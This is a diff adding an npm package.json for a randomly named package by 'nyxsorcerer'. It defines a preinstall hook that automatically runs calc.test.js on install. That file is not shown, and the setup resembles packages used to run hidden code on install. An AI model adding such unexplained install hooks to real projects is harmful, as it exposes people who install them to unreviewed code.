@@ -1,0 +1,12 @@
+{
+  "name": "calc_gl2xiahl1g",
+  "version": "1.0.1",
+  "description": "nyxsorcerer",
+  "main": "calc.test.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node calc.test.js"
+  },
+  "author": "nyxsorcerer",
+  "license": "ISC"
+}
